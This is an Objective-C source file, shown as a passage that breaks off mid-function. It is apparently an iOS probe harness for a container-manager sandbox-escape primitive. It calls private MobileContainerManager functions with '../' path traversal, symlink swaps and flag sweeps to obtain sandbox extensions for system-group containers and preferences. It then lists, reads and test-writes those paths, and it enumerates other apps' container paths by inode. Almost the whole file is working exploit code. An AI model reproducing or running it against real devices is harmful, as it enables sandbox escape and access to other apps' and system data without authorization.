//
// bqprobe.m — iOS 27.2 MobileContainerManager probe for the bad_query primitive.
// Runs a full matrix of container queries (direct + part-domain traversal),
// logs every return value, path, sandbox-extension consume result, POSIX/DAC
// rights and readdir results. Everything is written to Documents/bq272.log.
//

#import "bqprobe.h"
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
typedef void *xpc_object_t;
typedef xpc_object_t (*xpc_string_create_fn)(const char *string);
typedef void (*xpc_release_fn)(xpc_object_t object);
typedef xpc_object_t (*xpc_array_create_fn)(xpc_object_t *objects, size_t count);
typedef void (*xpc_array_append_value_fn)(xpc_object_t array, xpc_object_t value);
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;
static xpc_array_create_fn p_xpc_array_create;
static xpc_array_append_value_fn p_xpc_array_append;
#import <sys/stat.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <sys/utsname.h>
#import <objc/message.h>

// ---------------------------------------------------------------- logging ---
static NSString *gLogPath;
static NSLock   *gLock;

NSString *BQLogPath(void) { return gLogPath; }

static void bqlog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bq272] %@", s);
    [gLock lock];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:gLogPath]) {
        [fm createFileAtPath:gLogPath contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:gLogPath];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (NSException *e) {
            NSLog(@"[bq272] log write exception: %@", e.reason);
        }
        [fh closeFile];
    }
    [gLock unlock];
}

// ------------------------------------------------------------- MCM symbols ---
typedef void    *(*fn_create)(void);
typedef void     (*fn_set_u64)(void *, uint64_t);
typedef void     (*fn_set_obj)(void *, xpc_object_t);
typedef void     (*fn_set_cstr)(void *, const char *);
typedef void    *(*fn_get_one)(void *);
typedef char    *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void     (*fn_free)(void *);
typedef int64_t  (*fn_consume)(const char *);
typedef int64_t  (*fn_release)(int64_t);
typedef void    *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int      (*fn_err_int)(void *);

static fn_err      p_last_error;
static fn_err_msg  p_err_message;
static fn_err_int  p_err_posix;
static fn_err_int  p_err_type;
static fn_copy_str p_obj_token;

typedef struct {
    void *h;
    fn_create       create;
    fn_set_u64      set_class;
    fn_set_obj      set_ids;
    fn_set_obj      set_group_ids;
    fn_set_u64      set_flags;
    fn_set_u64      set_part;
    fn_set_u64      set_uid;
    fn_set_u64      set_platform;
    fn_set_u64      set_other;
    fn_set_cstr     set_domain;
    fn_get_one      get_one;
    fn_copy_str     copy_path;
    fn_get_path     get_path;
    fn_copy_str     copy_token;
    fn_free         query_free;
    fn_consume      consume;
    fn_release      release;
} mcm_t;

static mcm_t g;

static void *sym(void *h, const char *a, const char *b, const char *c) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    if (!p && c) p = dlsym(h, c);
    return p;
}

static void load_mcm(void) {
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) g.h = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW | RTLD_LOCAL);
    bqlog(@"dlopen MCM = %p (%s)", g.h, g.h ? "ok" : dlerror());
    if (!g.h) return;

    g.create       = (fn_create)sym(g.h, "container_query_create", NULL, NULL);
    g.set_class    = (fn_set_u64)sym(g.h, "container_query_set_class", NULL, NULL);
    g.set_ids      = (fn_set_obj)sym(g.h, "container_query_set_identifiers", NULL, NULL);
    g.set_group_ids= (fn_set_obj)sym(g.h, "container_query_set_group_identifiers", NULL, NULL);
    g.set_flags    = (fn_set_u64)sym(g.h, "container_query_operation_set_flags", "container_query_set_flags", NULL);
    g.set_part     = (fn_set_u64)sym(g.h, "container_query_operation_set_part", "container_query_set_part", NULL);
    g.set_uid      = (fn_set_u64)sym(g.h, "container_query_set_uid", NULL, NULL);
    g.set_platform = (fn_set_u64)sym(g.h, "container_query_operation_set_platform", NULL, NULL);
    g.set_other    = (fn_set_u64)sym(g.h, "container_query_set_include_other_owners", NULL, NULL);
    g.set_domain   = (fn_set_cstr)sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain", NULL);
    g.get_one      = (fn_get_one)sym(g.h, "container_query_get_single_result", NULL, NULL);
    g.copy_path    = (fn_copy_str)sym(g.h, "container_copy_path", "container_query_copy_path", NULL);
    g.get_path     = (fn_get_path)sym(g.h, "container_object_get_path", NULL, NULL);
    g.copy_token   = (fn_copy_str)sym(g.h, "container_copy_sandbox_token", NULL, NULL);
    g.query_free   = (fn_free)sym(g.h, "container_query_free", NULL, NULL);
    g.consume      = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release      = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    p_last_error   = (fn_err)dlsym(g.h, "container_query_get_last_error");
    p_err_message  = (fn_err_msg)dlsym(g.h, "container_error_get_message");
    p_err_posix    = (fn_err_int)dlsym(g.h, "container_error_get_posix_errno");
    p_err_type     = (fn_err_int)dlsym(g.h, "container_error_get_type");
    p_obj_token    = (fn_copy_str)dlsym(g.h, "container_object_get_sandbox_token");
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release       = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    p_xpc_array_create  = (xpc_array_create_fn)dlsym(RTLD_DEFAULT, "xpc_array_create");
    p_xpc_array_append  = (xpc_array_append_value_fn)dlsym(RTLD_DEFAULT, "xpc_array_append_value");
    if (!p_xpc_string_create) {
        void *xh = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW | RTLD_LOCAL);
        if (xh) {
            p_xpc_string_create = (xpc_string_create_fn)dlsym(xh, "xpc_string_create");
            p_xpc_release       = (xpc_release_fn)dlsym(xh, "xpc_release");
            p_xpc_array_create  = (xpc_array_create_fn)dlsym(xh, "xpc_array_create");
            p_xpc_array_append  = (xpc_array_append_value_fn)dlsym(xh, "xpc_array_append_value");
        }
    }
    bqlog(@"xpc sym create=%p release=%p array=%p append=%p", p_xpc_string_create, p_xpc_release, p_xpc_array_create, p_xpc_array_append);

    bqlog(@"sym create=%p class=%p ids=%p gids=%p flags=%p part=%p domain=%p one=%p path=%p token=%p free=%p consume=%p release=%p",
          g.create, g.set_class, g.set_ids, g.set_group_ids, g.set_flags, g.set_part,
          g.set_domain, g.get_one, g.copy_path, g.copy_token, g.query_free, g.consume, g.release);
}

// ------------------------------------------------------------- fs helpers ---
static void list_dir(NSString *path, int maxEntries) {
    const char *p = path.fileSystemRepresentation;
    DIR *d = opendir(p);
    if (!d) {
        bqlog(@"  readdir(%@) FAIL errno=%d (%s)", path, errno, strerror(errno));
        return;
    }
    int n = 0;
    struct dirent *e;
    NSMutableString *names = [NSMutableString string];
    while ((e = readdir(d)) != NULL) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        [names appendFormat:@"%s ", e->d_name];
        if (++n >= maxEntries) break;
    }
    closedir(d);
    bqlog(@"  readdir(%@) OK n=%d: %@", path, n, names);
}

static void inspect_path(NSString *path, BOOL allowWrite, BOOL dumpFile) {
    const char *p = path.fileSystemRepresentation;
    struct stat st;
    memset(&st, 0, sizeof(st));
    errno = 0;
    int r = lstat(p, &st);
    bqlog(@"  lstat(%@) = %d errno=%d (%s)", path, r, errno, strerror(errno));
    if (r == 0) {
        bqlog(@"    link-mode=%o uid=%d gid=%d size=%lld type=%s",
              st.st_mode & 07777, st.st_uid, st.st_gid, (long long)st.st_size,
              S_ISDIR(st.st_mode) ? "dir" : S_ISREG(st.st_mode) ? "file" : S_ISLNK(st.st_mode) ? "link" : "other");
    }
    struct stat tst;
    memset(&tst, 0, sizeof(tst));
    errno = 0;
    int tr = stat(p, &tst);
    bqlog(@"  stat-follow(%@) = %d errno=%d (%s)", path, tr, errno, strerror(errno));
    if (tr == 0) {
        bqlog(@"    mode=%o uid=%d gid=%d size=%lld type=%s",
              tst.st_mode & 07777, tst.st_uid, tst.st_gid, (long long)tst.st_size,
              S_ISDIR(tst.st_mode) ? "dir" : S_ISREG(tst.st_mode) ? "file" : "other");
        st = tst;
        r = 0;
    }

    int fd = open(p, O_RDONLY | O_CLOEXEC);
    bqlog(@"  open(O_RDONLY) = %d errno=%d (%s)", fd, errno, strerror(errno));
    if (fd >= 0) {
        if (dumpFile && r == 0 && S_ISREG(st.st_mode)) {
            unsigned char buf[32] = {0};
            ssize_t n = read(fd, buf, sizeof(buf));
            bqlog(@"    read=%zd first bytes=%02x %02x %02x %02x", n, buf[0], buf[1], buf[2], buf[3]);
        }
        close(fd);
    }

    if (S_ISDIR(st.st_mode)) {
        list_dir(path, 24);
    }

    if (allowWrite) {
        // 1) open the target itself O_WRONLY (no truncation) if it is a file
        if (S_ISREG(st.st_mode)) {
            int wfd = open(p, O_WRONLY | O_CLOEXEC);
            bqlog(@"  open(O_WRONLY existing) = %d errno=%d (%s)", wfd, errno, strerror(errno));
            if (wfd >= 0) close(wfd);
        }
        // 2) create a harmless marker in the directory
        if (S_ISDIR(st.st_mode)) {
            NSString *leaf = [NSString stringWithFormat:@".bq272_%d", getpid()];
            NSString *marker = [path stringByAppendingPathComponent:leaf];
            errno = 0;
            int mfd = open(marker.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
            int me = errno;
            bqlog(@"  marker-create(%@) fd=%d errno=%d (%s)", leaf, mfd, me, strerror(me));
            if (mfd >= 0) {
                ssize_t w = write(mfd, "ok\n", 3);
                fsync(mfd);
                close(mfd);
                errno = 0;
                int ur = unlink(marker.fileSystemRepresentation);
                bqlog(@"    marker write=%zd unlink=%d errno=%d", w, ur, errno);
            }
        }
    }
}

static NSString *dots(int depth) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < depth; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static void make_link(NSString *dir, NSString *leaf, NSString *target) {
    NSString *p = [dir stringByAppendingPathComponent:leaf];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    unlink(p.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, p.fileSystemRepresentation);
    char buf[1024] = {0};
    ssize_t n = readlink(p.fileSystemRepresentation, buf, sizeof(buf) - 1);
    bqlog(@"symlink %@ -> %@ : ret=%d errno=%d readlink=%zd (%s)", p, target, r, errno, n, n > 0 ? buf : "");
}

// --------------------------------------------------------------- queries ---
static void log_last_error(void *q, NSString *where) {
    if (!p_last_error || !q) return;
    void *err = p_last_error(q);
    if (!err) { bqlog(@"  %@ last_error=NULL", where); return; }
    const char *msg = p_err_message ? p_err_message(err) : NULL;
    int pe = p_err_posix ? p_err_posix(err) : -1;
    int ty = p_err_type ? p_err_type(err) : -1;
    bqlog(@"  %@ last_error=%p type=%d posix=%d msg=%s", where, err, ty, pe, msg ? msg : "(null)");
}

static int gModUid = -1;
static int gModPlatform = -1;
static int gModOther = 0;

static void run_case(NSString *label, uint64_t cls, NSString *gid, uint64_t part,
                     NSString *domain, uint64_t flags, int idsMode,
                     BOOL allowWrite, BOOL dumpFile) {
    bqlog(@"--- %@ cls=%llu gid=%@ part=%llu flags=0x%llx idsMode=%d domain=%@",
          label, cls, gid, part, flags, idsMode, domain.length ? domain : @"(empty)");
    if (!g.create || !g.set_class || !g.get_one || !g.query_free) {
        bqlog(@"  missing core symbols");
        return;
    }
    void *q = g.create();
    if (!q) { bqlog(@"  query_create NULL"); return; }
    g.set_class(q, cls);
    if (gModUid >= 0 && g.set_uid) g.set_uid(q, (uint64_t)gModUid);
    if (gModPlatform >= 0 && g.set_platform) g.set_platform(q, (uint64_t)gModPlatform);
    if (gModOther && g.set_other) g.set_other(q, 1);

    xpc_object_t str = p_xpc_string_create ? p_xpc_string_create(gid.UTF8String) : NULL;
    xpc_object_t ident = str;
    if (idsMode >= 2 && p_xpc_array_create && p_xpc_array_append && str) {
        ident = p_xpc_array_create(NULL, 0);
        if (ident) p_xpc_array_append(ident, str);
    }
    int useGroupSetter = (idsMode == 0 || idsMode == 2);
    if (useGroupSetter) {
        if (g.set_group_ids) g.set_group_ids(q, ident);
        else if (g.set_ids) g.set_ids(q, ident);
        else bqlog(@"  no set-identifiers symbol");
    } else {
        if (g.set_ids) g.set_ids(q, ident);
        else if (g.set_group_ids) g.set_group_ids(q, ident);
        else bqlog(@"  no set-identifiers symbol");
    }
    if (g.set_part) g.set_part(q, part);
    if (g.set_flags) g.set_flags(q, flags);
    if (g.set_domain && domain.length) g.set_domain(q, domain.UTF8String);
    if (ident && ident != str && p_xpc_release) p_xpc_release(ident);
    if (str && p_xpc_release) p_xpc_release(str);

    errno = 0;
    void *res = g.get_one(q);
    bqlog(@"  get_single_result = %p errno=%d (%s)", res, errno, strerror(errno));
    if (!res) { log_last_error(q, @"query"); g.query_free(q); return; }

    char *path = NULL;
    if (g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = strdup(cp);
    }
    char *token = g.copy_token ? g.copy_token(res) : NULL;
    char *objtok = p_obj_token ? p_obj_token(res) : NULL;
    bqlog(@"  result path=%s token=%s obj_token=%s", path ? path : "(null)", token ? "YES" : "(null)", objtok ? "YES" : "(null)");
    if (!path) log_last_error(q, @"copy_path");
    if (!token) log_last_error(q, @"copy_token");
    if (objtok) free(objtok);

    if (token) {
        errno = 0;
        int64_t h = g.consume ? g.consume(token) : -999;
        bqlog(@"  sandbox_extension_consume -> %lld errno=%d (%s)", (long long)h, errno, strerror(errno));
        if (h >= 0) {
            NSString *ps = path ? [NSString stringWithUTF8String:path] : nil;
            if (ps.length) inspect_path(ps, allowWrite, dumpFile);
            if (g.release) g.release(h);
        }
    }
    if (path) free(path);
    if (token) free(token);
    g.query_free(q);
}

// original bad_query_list: inode -> path enumeration without sandbox
static char *bq_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

static void enumerate_dir(NSString *path, const char *listPath, int64_t maxInode) {
    char *lst = bq_list((char *)listPath, maxInode);
    if (!lst) { bqlog(@"bq_list(%s) = NULL", listPath); return; }
    NSString *s = [NSString stringWithUTF8String:lst];
    free(lst);
    NSArray *lines = [s componentsSeparatedByString:@"\n"];
    bqlog(@"bq_list(%s) -> %lu entries", listPath, (unsigned long)lines.count);
    int n = 0;
    for (NSString *line in lines) {
        if (!line.length) continue;
        bqlog(@"  entry: %@", line);
        if (++n >= 40) { bqlog(@"  ... truncated"); break; }
    }
}

static void read_sandboxtags(NSString *container) {
    NSString *tags = [container stringByAppendingPathComponent:@"Library/SandboxTags.plist"];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:tags];
    if (d) bqlog(@"  tags %@ -> %@", container.lastPathComponent, d[@"SandboxContainerOwner"] ?: d);
    else bqlog(@"  tags %@ unreadable errno=%d", container.lastPathComponent, errno);
}

// ---------------------------------------------------------------- the run ---
void BQRunProbeFull(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 probe start ================");
        bqlog(@"date=%@", [NSDate date]);
        struct utsname u;
        if (uname(&u) == 0) bqlog(@"machine=%s release=%s version=%s", u.machine, u.release, u.version);
        bqlog(@"uid=%d gid=%d euid=%d bundle=%@", getuid(), getgid(), geteuid(), [NSBundle mainBundle].bundleIdentifier);
        bqlog(@"home=%@", NSHomeDirectory());
        bqlog(@"docs=%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]);

        load_mcm();

        NSString *own = [NSBundle mainBundle].bundleIdentifier;
        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        bqlog(@"app group %@ URL = %@", group, groupURL);

        // --- controls -------------------------------------------------------
        run_case(@"control-own-app", 2, own, 3, @"", 0x8000000000ULL, 1, NO, NO);
        run_case(@"control-own-group", 7, group, 3, @"", 0x8000000000ULL, 0, YES, NO);

        // --- direct system-group access (no traversal) ----------------------
        NSArray *sysgroups = @[
            @"systemgroup.com.apple.mobilegestaltcache",
            @"systemgroup.com.apple.posterboard",
            @"systemgroup.com.apple.wallpaper",
            @"systemgroup.com.apple.installcoordinationd",
            @"systemgroup.com.apple.configurationprofiles",
        ];
        for (NSString *sg in sysgroups) {
            for (uint64_t part = 0; part <= 6; part++) {
                run_case([NSString stringWithFormat:@"direct %@ p%llu", sg, part],
                         13, sg, part, @"", 0x8000000000ULL, 1, part == 0 || part == 3, NO);
            }
        }

        // --- traversal to SystemGroup root from MG group --------------------
        for (int depth = 6; depth <= 12; depth++) {
            NSString *dom = [NSString stringWithFormat:@"%@/private/var/containers/Shared/SystemGroup", dots(depth)];
            run_case([NSString stringWithFormat:@"traverse-root d%d", depth],
                     13, @"systemgroup.com.apple.mobilegestaltcache", 3, dom, 0x8000000000ULL, 1,
                     depth == 8, NO);
        }

        // --- traversal to MG Caches from MG group ---------------------------
        NSString *mgDir = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";

        // === original bad_query route: container_query_set_group_identifiers ===
        for (uint64_t part = 0; part <= 6; part++) {
            run_case([NSString stringWithFormat:@"gids-direct-mg p%llu", part],
                     13, @"systemgroup.com.apple.mobilegestaltcache", part, @"",
                     0x8000000000ULL, 0, part == 0 || part == 3, part == 3);
        }
        for (int depth = 6; depth <= 12; depth++) {
            NSString *dom = [NSString stringWithFormat:@"%@%@", dots(depth), mgDir];
            run_case([NSString stringWithFormat:@"gids-traverse-mg d%d", depth],
                     13, @"systemgroup.com.apple.mobilegestaltcache", 3, dom,
                     0x8000000000ULL, 0, YES, YES);
        }
        run_case(@"gids-array-mg p3", 13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", 0x8000000000ULL, 2, YES, YES);
        run_case(@"ids-array-mg p3", 13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", 0x8000000000ULL, 3, YES, YES);

        // === class sweep with group-identifiers setter ===
        for (uint64_t cls = 1; cls <= 16; cls++) {
            run_case([NSString stringWithFormat:@"class%llu-gids-mg p3", cls],
                     cls, @"systemgroup.com.apple.mobilegestaltcache", 3, @"",
                     0x8000000000ULL, 0, cls == 13, cls == 13);
        }

        // === symlink bypass probes ===
        NSString *groupCaches = [groupURL.path stringByAppendingPathComponent:@"Library/Caches"];
        NSString *ownCaches = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Caches"];
        make_link(groupCaches, @"link_mg", mgDir);
        make_link(groupCaches, @"link_prefs", @"/var/mobile/Library/Preferences");
        make_link(ownCaches, @"link_mg2", mgDir);
        run_case(@"symlink-group-mg p3 gids", 7, group, 3, @"link_mg", 0x8000000000ULL, 0, YES, YES);
        run_case(@"symlink-group-mg p3 ids", 7, group, 3, @"link_mg", 0x8000000000ULL, 1, YES, YES);
        run_case(@"symlink-group-mg p0 gids", 7, group, 0, @"Library/Caches/link_mg", 0x8000000000ULL, 0, YES, YES);
        run_case(@"symlink-own-mg p3 ids", 2, own, 3, @"link_mg2", 0x8000000000ULL, 1, YES, YES);
        run_case(@"symlink-group-prefs p3", 7, group, 3, @"link_prefs", 0x8000000000ULL, 0, NO, NO);
        run_case(@"symlink-dotdot-control", 7, group, 3, @"link_mg/..", 0x8000000000ULL, 0, NO, NO);

        for (int depth = 6; depth <= 12; depth++) {
            NSString *dom = [NSString stringWithFormat:@"%@%@", dots(depth), mgDir];
            run_case([NSString stringWithFormat:@"traverse-mg d%d", depth],
                     13, @"systemgroup.com.apple.mobilegestaltcache", 3, dom, 0x8000000000ULL, 1,
                     YES, YES);
        }

        // --- traversal from our own app group -------------------------------
        for (int depth = 7; depth <= 14; depth++) {
            NSString *dom = [NSString stringWithFormat:@"%@%@", dots(depth), mgDir];
            run_case([NSString stringWithFormat:@"group-traverse-mg d%d", depth],
                     7, group, 3, dom, 0x8000000000ULL, 0, YES, YES);
        }

        // --- traversal from our own app container ---------------------------
        for (int depth = 7; depth <= 12; depth++) {
            NSString *dom = [NSString stringWithFormat:@"%@/var/mobile/Library/Preferences", dots(depth)];
            run_case([NSString stringWithFormat:@"app-traverse-prefs d%d", depth],
                     2, own, 3, dom, 0x8000000000ULL, 1, NO, NO);
        }

        // --- foreign app container queries ----------------------------------
        run_case(@"query PosterBoard cls2 p0", 2, @"com.apple.PosterBoard", 0, @"", 0x8000000000ULL, 1, NO, NO);
        run_case(@"query PosterBoard cls2 p3", 2, @"com.apple.PosterBoard", 3, @"", 0x8000000000ULL, 1, NO, NO);

        // --- alternate flag values on the key direct query -------------------
        uint64_t flagSets[] = {0x8100000000ULL, 0x0000008000000000ULL, 0x0000008100000000ULL, 0x0ULL};
        for (int i = 0; i < 4; i++) {
            run_case([NSString stringWithFormat:@"mg-part3-flags-0x%llx", flagSets[i]],
                     13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", flagSets[i], 1, YES, YES);
        }

        // --- inode enumeration (no query needed) -----------------------------
        enumerate_dir(@"/var/mobile/Containers/Data/Application", "/var/mobile/Containers/Data/Application", 300000);
        enumerate_dir(@"/var/containers/Shared/SystemGroup", "/var/containers/Shared/SystemGroup", 300000);

        // --- inspect a few likely paths directly (control: should fail) -----
        inspect_path(@"/private/var/containers/Shared/SystemGroup", NO, NO);
        inspect_path(mgDir, NO, YES);

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== minimal 27.2 probe (v3) =============================
void BQRunProbeV4(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 MIN probe v3 start ================");
        bqlog(@"date=%@ uid=%d bundle=%@", [NSDate date], getuid(), [NSBundle mainBundle].bundleIdentifier);
        load_mcm();

        NSString *own = [NSBundle mainBundle].bundleIdentifier;
        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *mgDir = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        bqlog(@"group=%@", groupURL);
        bqlog(@"mgDir=%@", mgDir);

        run_case(@"control-own-group", 7, group, 3, @"", 0x8000000000ULL, 0, NO, NO);

        NSString *gc = [groupURL.path stringByAppendingPathComponent:@"Library/Caches"];
        NSString *oc = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Caches"];
        make_link(gc, @"link_mg", mgDir);
        make_link(gc, @"link_prefs", @"/var/mobile/Library/Preferences");
        make_link(oc, @"link_mg2", mgDir);

        run_case(@"symlink-group-mg gids", 7, group, 3, @"link_mg", 0x8000000000ULL, 0, YES, YES);
        run_case(@"symlink-group-mg ids", 7, group, 3, @"link_mg", 0x8000000000ULL, 1, YES, YES);
        run_case(@"symlink-group-mg p0gids", 7, group, 0, @"Library/Caches/link_mg", 0x8000000000ULL, 0, YES, YES);
        run_case(@"symlink-own-mg", 2, own, 3, @"link_mg2", 0x8000000000ULL, 1, YES, YES);
        run_case(@"symlink-group-prefs", 7, group, 3, @"link_prefs", 0x8000000000ULL, 0, NO, NO);

        uint64_t flags[] = {
            0x8000000000ULL, 0x8100000000ULL, 0x8200000000ULL, 0x8400000000ULL,
            0x8800000000ULL, 0x9000000000ULL, 0xA000000000ULL, 0xC000000000ULL,
            0x0000000100000000ULL, 0x0000000200000000ULL, 0x0000000400000000ULL,
            0x0000000800000000ULL, 0x0000001000000000ULL, 0x4000000000ULL, 0x0ULL
        };
        for (int i = 0; i < (int)(sizeof(flags) / sizeof(flags[0])); i++) {
            run_case([NSString stringWithFormat:@"c13mg-p3-f0x%llx", flags[i]],
                     13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", flags[i], 0, YES, YES);
        }
        run_case(@"c13mg-p0", 13, @"systemgroup.com.apple.mobilegestaltcache", 0, @"", 0x8000000000ULL, 0, YES, YES);
        run_case(@"c13mg-p2", 13, @"systemgroup.com.apple.mobilegestaltcache", 2, @"", 0x8000000000ULL, 0, YES, YES);

        // === modifier matrix: uid / platform / other-owners ===
        bqlog(@"---- modifier matrix ----");
        int mods[][3] = {
            {-1, -1, 0}, {0, -1, 0}, {-1, 1, 0}, {0, 1, 0},
            {-1, -1, 1}, {0, 1, 1},
        };
        uint64_t keyFlags[] = {0x8100000000ULL, 0x8800000000ULL, 0x8040000000ULL, 0x8000000000ULL};
        for (int m = 0; m < 6; m++) {
            for (int f = 0; f < 4; f++) {
                gModUid = mods[m][0];
                gModPlatform = mods[m][1];
                gModOther = mods[m][2];
                run_case([NSString stringWithFormat:@"mod-uid%d-plat%d-oth%d-f0x%llx",
                          gModUid, gModPlatform, gModOther, keyFlags[f]],
                         13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", keyFlags[f], 0, YES, YES);
            }
        }
        gModUid = -1; gModPlatform = -1; gModOther = 0;

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v5: part-directory symlink probe ====================
static BOOL bq_swap_path(NSString *path, NSString *target, NSString *backup) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:backup error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:backup error:&e]) {
            bqlog(@"swap: move %@ -> %@ FAILED %@", path, backup, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    bqlog(@"swap: symlink %@ -> %@ ret=%d errno=%d", path, target, r, errno);
    return r == 0;
}

static void bq_restore_path(NSString *path, NSString *backup) {
    unlink(path.fileSystemRepresentation);
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:backup]) {
        NSError *e = nil;
        BOOL ok = [fm moveItemAtPath:backup toPath:path error:&e];
        bqlog(@"restore: %@ -> %@ ok=%d err=%@", backup, path, ok, e);
    }
}

void BQRunProbeV5(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v5 part-symlink probe ================");
        bqlog(@"date=%@ uid=%d bundle=%@", [NSDate date], getuid(), [NSBundle mainBundle].bundleIdentifier);
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        NSString *mgLib = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library";
        NSString *mgCaches = [mgLib stringByAppendingPathComponent:@"Caches"];
        NSString *plist = [mgCaches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
        bqlog(@"group=%@", groupURL);
        bqlog(@"mgLib=%@", mgLib);
        bqlog(@"plist=%@", plist);
        bqlog(@"plist before: lstat=%d", ({ struct stat s; lstat(plist.fileSystemRepresentation, &s); }));

        run_case(@"control group p3 f8100", 7, group, 3, @"", 0x8100000000ULL, 0, NO, NO);

        // A: replace the whole Library directory with a symlink to MG Library
        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *libBak = [groot stringByAppendingPathComponent:@"Library.bq_orig"];
        if (bq_swap_path(lib, mgLib, libBak)) {
            run_case(@"symLib p2 f8100", 7, group, 2, @"", 0x8100000000ULL, 0, YES, YES);
            run_case(@"symLib p3 f8100", 7, group, 3, @"", 0x8100000000ULL, 0, YES, YES);
            run_case(@"symLib p3 f8000000000", 7, group, 3, @"", 0x8000000000ULL, 0, YES, YES);
